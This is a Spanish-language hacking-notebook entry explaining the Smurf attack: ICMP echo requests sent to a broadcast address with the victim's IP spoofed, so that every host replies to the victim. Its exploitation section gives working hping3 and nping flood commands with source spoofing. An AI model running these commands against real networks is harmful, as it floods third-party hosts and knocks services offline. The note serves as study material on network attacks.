# Teoría

**Smurf Attack** es una variante de [[ICMP Flooding]] que utiliza **amplificación mediante broadcast** para saturar un objetivo.

El ataque consiste en enviar #ICMP **Echo Request** a una dirección de broadcast de red con la **IP de origen falsificada** ([[ICMP Spoofing]]) de la víctima, provocando que todos los hosts de la red broadcast respondan simultáneamente a la víctima.

![[icmp-smurf-attack.excalidraw|center]]

## Funcionamiento

1. El **atacante** envía ICMP Echo Request a dirección **broadcast** (ej: `192.168.1.255`), falsificando la **IP de origen** con la IP de la **víctima**.
2. **Todos los hosts** de la red broadcast reciben el paquete.
3. **Todos los hosts** envían ICMP Echo Reply a la **víctima**.
4. La **víctima** recibe múltiples respuestas simultáneas (**amplificación**).

# Explotación

El factor de amplificación de este ataque depende de la cantidad de dispositivos conectados a la red y que respondan a la dirección broadcast:

→ Si una red tiene 100 hosts, el atacante envía **1 paquete** y la víctima recibe **100 paquetes**.

~~~tabs

tab: hping3

<span query="codeBlock(_/variables/hacking.md/rhost, _/variables/hacking.md/broadcast, code = hping3 --icmp --flood --spoof {{rhost}} {{broadcast}}, lang = )"></span>
``` 
hping3 --icmp --flood --spoof ${RHOST} ${BROADCAST}
```
<span type="end"></span>


tab: nping

<span query="codeBlock(_/variables/hacking.md/rhost, _/variables/hacking.md/broadcast, code = nping --icmp --rate 1000 --source-ip {{rhost}} {{broadcast}}, lang = )"></span>
``` 
nping --icmp --rate 1000 --source-ip ${RHOST} ${BROADCAST}
```
<span type="end"></span>

~~~

# Recursos

~~~tabs

tab: Herramientas

| Repositorio | Descripción |
| ---------------------------------------------------- | ---------------------------------------------------------------- |
| [`hping3`](https://www.kali.org/tools/hping3/) | Active network smashing tool |
| [`nmap (nping)`](https://www.kali.org/tools/nmap/#nping) | Network packet generation tool / ping utility |

~~~
